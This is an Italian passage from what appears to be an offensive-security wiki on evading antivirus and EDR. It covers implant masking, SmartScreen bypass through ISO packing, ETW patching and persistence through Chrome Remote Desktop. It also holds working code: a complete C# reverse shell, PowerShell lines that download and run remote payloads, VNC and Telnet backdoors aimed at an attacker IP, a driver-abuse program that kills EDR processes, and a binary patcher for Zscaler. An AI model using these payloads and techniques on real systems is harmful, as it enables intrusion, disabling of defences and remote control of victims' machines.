- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un PE Crypter .NET scritto in Nim.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli.

### Mascheramento autonomo per funzione assistito dal compilatore LLVM

Invece di mascherare un intero implant solo mentre è inattivo, un backend LLVM X86 modificato può mantenere selezionate funzioni mascherate con XOR ogni volta che sono inattive. La PoC Function Peekaboo seleziona i nomi demangled che contengono `REG_`, inserisce stub di ingresso/uscita position-independent attorno al codice macchina finale e genera un unico handler di mascheramento condiviso in `.text`; le firme a livello sorgente e la calling convention Windows x64 restano invariate.<sup>[[38]](#references)[[39]](#references)</sup>

#### Trasformazione del flusso di controllo nel backend

La trasformazione va eseguita dopo la selezione delle istruzioni e l'ottimizzazione, perché deve includere **ogni return emesso** e conoscere l'esatto layout x86. Una `MachineFunctionPass` pre-emissione individua l'ultimo `MachineInstr::isReturn()`, lo elimina in modo che il percorso finale prosegua nell'epilogo aggiunto e sostituisce i return precedenti con `JMP_1 handler`. Mantieni l'eventuale teardown dello stack/frame generato dal compilatore prima di ciascun return; reindirizza solo l'istruzione return.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` e `emitFunctionBodyEnd()` emettono gli stub per funzione, mentre `emitEndOfAsmFile()` emette l'handler. I simboli condivisi tra le fasi di emissione consentono a un branch del prologo di raggiungere il suo epilogo, emesso successivamente; per un `je` near emesso manualmente, scrivi `0F 84` seguito dall'espressione MC a quattro byte `target - address_after_je`. Le chiamate e i salti all'handler possono invece essere emessi come oggetti `MCInst` (`CALL64pcrel32` e `JMP_1`). Una pass deve restituire `false` per una funzione non selezionata se non ha apportato modifiche; la PoC restituisce erroneamente `true` in quel caso.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadati e inizializzazione pre-CRT

La PoC inserisce in `.funcmeta` una chiave XOR e record da 16 byte contenenti un puntatore a funzione rilocato dal loader più una lunghezza a runtime. Sebbene il campo C sia un `uint32_t`, l'handler accede a un QWORD all'offset `+8` del record, leggendo la lunghezza e il relativo padding, e avanza tra i record di `0x10`. I nomi delle sezioni PE occupano solo otto byte, quindi la ricerca a runtime trova `.funcmet`. Un patcher esterno aggiunge una sezione eseguibile `.stub`, salva il vecchio RVA dell'entry point nello stub e reindirizza `AddressOfEntryPoint`; lo stub PIC ricava la image base da `gs:[0x60]` → `[PEB+0x10]`, percorre gli import PE32+ per risolvere una `VirtualProtect` già importata e viene eseguito prima del CRT.<sup>[[38]](#references)[[39]](#references)</sup>

L'inizializzazione imposta un sentinel in `gs:[0xE8]` e chiama ogni funzione dei metadati. Il prologo, che resta leggibile, registra l'inizio della funzione in `gs:[0xF0]`, rileva il sentinel e salta il body ancora non mascherato. L'epilogo usa quindi `call handler`; dopo che l'handler ha salvato 13 registri (`0x68` byte), l'indirizzo di ritorno in `[rsp+0x68]` corrisponde alla fine della funzione trasformata, quindi `end - start` può essere scritto nel relativo record dei metadati. Dopo aver mascherato tutti i body, lo stub cancella il sentinel e salta a `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Durante una chiamata normale, il prologo chiama lo stesso handler simmetrico per decodificare il body. Il percorso finale prosegue nell'epilogo aggiunto, mentre ogni return precedente salta direttamente all'handler condiviso. Anche l'epilogo normale usa `jmp handler` anziché `call`, così, dopo aver rimaskerato il codice, il `ret` dell'handler consuma l'indirizzo di ritorno del chiamante originale e preserva il risultato della funzione in `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva di mascheramento e indicatori di analisi

L'handler individua il record corrente, salta il prologo visibile a lunghezza fissa (in questa build, `0x46` byte), imposta il resto su `PAGE_EXECUTE_READWRITE`, applica XOR byte per byte usando il byte meno significativo della chiave e poi lo imposta su `PAGE_EXECUTE_READ`. Lo stesso ciclo decodifica quindi all'ingresso e codifica a ogni uscita normale.<sup>[[38]](#references)[[39]](#references)</sup>

Gli indicatori ad alta affidabilità di questo design includono:<sup>[[38]](#references)[[39]](#references)</sup>

- un entry point all'interno di uno `.stub` eseguibile e una sezione `.funcmet` contenente una chiave e puntatori rilocati a `.text`;
- parsing pre-CRT di PEB, tabella degli import e tabella delle sezioni, seguito da chiamate tramite ciascun puntatore dei metadati;
- prologhi PIC `call`/`pop` identici e numerosi return reindirizzati a un unico handler;
- scritture a `gs:[0xE8]`, `gs:[0xF0]` e `gs:[0xF8]`, seguite da ripetute transizioni `VirtualProtect` e scritture XOR byte per byte in pagine eseguibili supportate dall'immagine.

Questa è un'evasione degli scanner di memoria, non una protezione crittografica: il file patchato contiene ancora il body originale in chiaro e un debugger può impostare un breakpoint su `VirtualProtect` o sul ciclo XOR e acquisire la funzione attiva. Anche l'XOR a un solo byte, i metadati leggibili e il confine fisso `0x46` rendono semplice il recupero offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Gli slot TEB della PoC sono thread-local, ma le pagine di codice modificate sono condivise a livello di processo. Un ingresso concorrente o ricorsivo può quindi ripristinare alternativamente le istruzioni mentre un'altra invocazione le sta eseguendo; anche le eccezioni e le uscite non locali possono aggirare la rimaskeratura. Un'implementazione robusta deve sincronizzare le transizioni, ripristinare la protezione effettivamente restituita tramite `lpflOldProtect`, evitare lunghezze dello stub hardcoded, verificare l'allineamento dello stack x64 sia nei percorsi `call` sia in quelli `jmp` e chiamare `FlushInstructionCache` dopo aver riscritto byte eseguibili. Microsoft attribuisce esplicitamente al chiamante la responsabilità della coerenza della instruction cache quando viene modificato codice eseguibile.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen e MoTW

Potresti aver visto questa schermata scaricando da Internet ed eseguendo alcuni eseguibili.

Microsoft Defender SmartScreen è un meccanismo di sicurezza pensato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen si basa principalmente sulla reputazione: le applicazioni scaricate raramente attivano SmartScreen, che avvisa l'utente finale e gli impedisce di eseguire il file (anche se è comunque possibile eseguirlo facendo clic su More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [Alternate Data Stream NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier, creato automaticamente quando si scaricano file da Internet, insieme all'URL da cui sono stati scaricati.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verifica dell'ADS Zone.Identifier di un file scaricato da Internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **attendibile** **non attivano SmartScreen**.

Un metodo molto efficace per impedire ai payload di ricevere il Mark of The Web è inserirli in un contenitore, ad esempio un ISO. Questo perché il Mark-of-the-Web (MOTW) **non può** essere applicato ai volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che inserisce i payload in contenitori di output per eludere il Mark-of-the-Web.

Esempio d'uso:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ecco una demo per aggirare SmartScreen impacchettando payload all'interno di file ISO con [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging di Windows che consente alle applicazioni e ai componenti di sistema di **registrare eventi**. Tuttavia, può anche essere usato dai prodotti di sicurezza per monitorare e rilevare attività dannose.

Come per la disattivazione (bypass) di AMSI, è anche possibile fare in modo che la funzione **`EtwEventWrite`** del processo in user space restituisca immediatamente il controllo senza registrare alcun evento. Per farlo, si applica una patch alla funzione in memoria affinché restituisca immediatamente il controllo, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare maggiori informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Riflessione degli assembly C#

Caricare in memoria binari C# è una tecnica nota da tempo ed è ancora un ottimo modo per eseguire i tuoi strumenti post-exploitation senza essere rilevati dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci solo di applicare una patch ad AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) permette già di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Consiste nel **creare un nuovo processo sacrificabile**, iniettare il tuo codice malevolo post-exploitation in quel nuovo processo, eseguirlo e, al termine, terminare il nuovo processo. Questo metodo presenta vantaggi e svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del processo del nostro impianto Beacon. Ciò significa che, se qualcosa va storto o viene rilevato durante l'attività post-exploitation, c'è una **probabilità molto maggiore** che il nostro **impianto sopravviva**. Lo svantaggio è che c'è una **probabilità maggiore** di essere rilevati dai **rilevamenti comportamentali**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste nell'iniettare il codice malevolo post-exploitation **nel processo stesso**. In questo modo, puoi evitare di creare un nuovo processo e farlo scansionare dall'AV; lo svantaggio è che, se qualcosa va storto durante l'esecuzione del payload, c'è una **probabilità molto maggiore** di **perdere il tuo beacon**, perché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi approfondire il caricamento di assembly C#, consulta questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare assembly C# **da PowerShell**; dai un'occhiata a [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e al [video di S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Uso di altri linguaggi di programmazione

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi, fornendo alla macchina compromessa accesso **all'ambiente dell'interprete installato sulla condivisione SMB controllata dall'attaccante**.

Consentendo l'accesso ai binari degli interpreti e all'ambiente sulla condivisione SMB, puoi **eseguire codice arbitrario in questi linguaggi nella memoria** della macchina compromessa.

Il repository indica che Defender continua a scansionare gli script, ma usando Go, Java, PHP, ecc. abbiamo **maggiore flessibilità nell'aggirare le signature statiche**. I test con script reverse shell casuali e non offuscati in questi linguaggi hanno dato esito positivo.

## TokenStomping

Token stomping manipola il token di accesso di un prodotto di sicurezza, come un EDR o un AV. Ridurre i privilegi del token può lasciare il processo in esecuzione, impedendogli però di svolgere attività di ispezione o remediation con privilegi elevati.

Per impedirlo, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Uso di software attendibile

### Chrome Remote Desktop

Come descritto in [**questo post del blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile installare Chrome Remote Desktop sul PC di una vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:<sup>[[35]](#references)</sup>
1. Scarica il programma da https://remotedesktop.google.com/, fai clic su "Set up via SSH" e poi sul file MSI per Windows per scaricarlo.
2. Esegui silenziosamente il programma di installazione sulla macchina della vittima (sono necessari privilegi di amministratore): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e fai clic su next. La procedura guidata ti chiederà di autorizzare; fai clic sul pulsante Authorize per continuare.
4. Esegui il comando fornito apportando le modifiche necessarie: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (il parametro `--pin` imposta il PIN senza usare l'interfaccia grafica).
 

## Evasione avanzata

L'evasione è un argomento molto complesso; a volte è necessario considerare molte fonti diverse di telemetria in un singolo sistema, quindi è praticamente impossibile rimanere completamente inosservati in ambienti maturi.

Ogni ambiente che dovrai affrontare avrà i propri punti di forza e di debolezza.

Ti consiglio vivamente di guardare questo intervento di [@ATTL4S](https://twitter.com/DaniLJ94) per farti un'idea delle tecniche di evasione più avanzate.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è anche un ottimo intervento di [@mariuszbit](https://twitter.com/mariuszbit) sull'evasione in profondità.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Tecniche obsolete**

### **Verificare quali parti Defender rileva come dannose**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), che **rimuove parti del binario** finché **non individua quale parte Defender** rileva come dannosa, per poi isolartela.\
Un altro strumento che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred), che offre il servizio tramite il web all'indirizzo [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Server Telnet**

Fino a Windows 10, tutte le versioni di Windows includevano un **server Telnet** che potevi installare (come amministratore) eseguendo:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Fai in modo che **si avvii** all'avvio del sistema ed **eseguilo** ora:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Cambiare la porta telnet** (stealth) e disabilitare il firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (ti servono i download bin, non il setup)

**SULL'HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Poi, sposta il binario _**winvnc.exe**_ e il file _**UltraVNC.ini**_ appena creato all'interno del **victim**

#### **Connessione inversa**

L'**attacker** deve **eseguire sul proprio** **host** il binario `vncviewer.exe -listen 5900`, così sarà **pronto** a ricevere una **connessione VNC** inversa. Poi, all'interno del **victim**: avvia il daemon winvnc con `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la stealth non devi fare alcune cose

- Non avviare `winvnc` se è già in esecuzione, altrimenti attiverai un [popup](https://i.imgur.com/1SROTTl.png). Controlla se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory, altrimenti si aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per visualizzare la guida, altrimenti attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

All'interno di GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Ora **avvia il listener** con `msfconsole -r file.rc` ed **esegui** il **payload XML** con:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**L'attuale Defender terminerà il processo molto rapidamente.**

### Compilare la nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima C# Revershell

Compilala con:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Usalo con:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# con il compilatore

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download ed esecuzione automatici:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco degli offuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Uso di Python per un esempio di creazione di injector:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Terminare AV/EDR dal kernel

Storm-2603 ha sfruttato una piccola utility per console nota come **Antivirus Terminator** per disabilitare le protezioni degli endpoint prima di rilasciare il ransomware. Lo strumento porta con sé un **driver vulnerabile ma *firmato*** e ne abusa per eseguire operazioni privilegiate nel kernel che neppure i servizi AV Protected-Process-Light (PPL) possono bloccare.<sup>[[12]](#references)</sup>

Punti chiave
1. **Driver firmato**: il file scritto su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys`, parte del “System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver ha una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Installazione del servizio**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   La prima riga registra il driver come **servizio kernel** e la seconda lo avvia, rendendo così `\\.\ServiceMouse` accessibile da userland.
3. **IOCTL esposti dal driver**
   | Codice IOCTL | Funzionalità                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Termina un processo arbitrario tramite PID (usato per terminare i servizi Defender/EDR) |
   | `0x990000D0` | Elimina un file arbitrario dal disco |
   | `0x990001D0` | Scarica il driver e rimuove il servizio |

   Proof of concept minimo in C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Perché funziona**: BYOVD aggira completamente le protezioni in user-mode; il codice eseguito nel kernel può aprire processi *protetti*, terminarli o manomettere oggetti del kernel, indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione
•  Abilita l’elenco di blocco dei driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`), in modo che Windows rifiuti di caricare `AToolsKrnl64.sys`.
•  Monitora la creazione di nuovi servizi *kernel* e genera un avviso quando un driver viene caricato da una directory scrivibile da tutti o non presente nell’elenco di consentiti.
•  Tieni d’occhio gli handle in user-mode verso oggetti dispositivo personalizzati, seguiti da chiamate `DeviceIoControl` sospette.

### Bypass dei controlli di conformità di Zscaler Client Connector tramite patch binaria su disco

**Client Connector** di Zscaler applica localmente le regole di conformità del dispositivo e si affida a Windows RPC per comunicare i risultati agli altri componenti. Due scelte progettuali deboli rendono possibile un bypass completo:

1. La valutazione della conformità avviene **interamente sul client** (al server viene inviato un valore booleano).
2. Gli endpoint RPC interni verificano solo che l’eseguibile che si connette sia **firmato da Zscaler** (tramite `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Applicando patch a quattro binari firmati su disco**, entrambi i meccanismi possono essere neutralizzati:

| Binario | Logica originale modificata con patch | Risultato |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1`, quindi tutti i controlli risultano conformi |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | Sostituita con NOP ⇒ qualsiasi processo (anche non firmato) può collegarsi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita da `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli di integrità del tunnel | Bypassati |

Estratto minimo del patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Dopo aver sostituito i file originali e riavviato lo stack di servizi:

* **Tutti** i controlli di postura risultano **verdi/conformi**.
* I binari non firmati o modificati possono aprire gli endpoint RPC named-pipe (ad es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L’host compromesso ottiene accesso senza restrizioni alla rete interna definita dalle policy Zscaler.

Questo case study dimostra come le decisioni di attendibilità puramente lato client e i semplici controlli delle firme possano essere elusi con poche patch di byte.

## Abuso delle funzionalità attendibili di Microsoft Defender `BTR.sys`

Il driver **Boot-Time Removal** di Defender è un utile controesempio al classico BYOVD. `BTR.sys` è un componente di remediation legittimo, firmato da Microsoft, senza bug di corruzione della memoria né interfaccia IOCTL; dopo aver ottenuto l’accesso amministrativo e `SeLoadDriverPrivilege`, un operatore può invece contraffare la sua transazione privata di remediation e ottenere le operazioni previste su file e registro in Ring-0. Si tratta di una **primitiva di neutralizzazione AV/EDR post-compromissione, non di accesso iniziale né di escalation dei privilegi**; inoltre, il driver può essere estratto dalla risorsa `BOOTTIMETOOL` del `MpEngine.dll` del target, anziché importare un vistoso driver di terze parti.<sup>[[36]](#references)</sup>

### Preparazione del driver one-shot

Normalmente Defender salva la risorsa in un file `[a-z]{8}.sys` con nome casuale e registra un servizio kernel con un nome simile. `DriverEntry` legge il valore `Args` del servizio, apre l’ADS NTFS indicato, decritta e convalida l’elenco di azioni, scrive il feedback e restituisce `0xC0000056` (`STATUS_DELETE_PENDING`) dopo l’esecuzione riuscita, in modo che il driver venga scaricato anziché rimanere residente. Un servizio contraffatto presenta i seguenti valori caratteristici.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Il flusso `:changelist` contiene un blob cifrato con RC4. Le build analizzate riutilizzano una chiave fissa di 256 byte, quindi la cifratura non costituisce un confine di autorizzazione. Un plaintext valido ha un header globale di 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC dell’header e un ID transazione derivato dal payload), seguito da un percorso di feedback UTF-16 con terminazione NUL e da un numero qualsiasi di elementi. Ogni elemento ha un header di 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) più dati specifici dell’azione, che terminano con **esattamente quattro byte NUL**. Ogni regione di header/dati viene verificata separatamente con CRC-32, polinomio `0xEDB88320`, stato iniziale `0xFFFFFFFF` e **senza XOR finale** (`~CRC32`); lo stato CRC viene reimpostato per ogni regione.<sup>[[36]](#references)[[37]](#references)</sup>

Gli ID delle azioni accettate espongono queste primitive del kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dati dell’elemento | Risultato |
| --- | --- | --- |
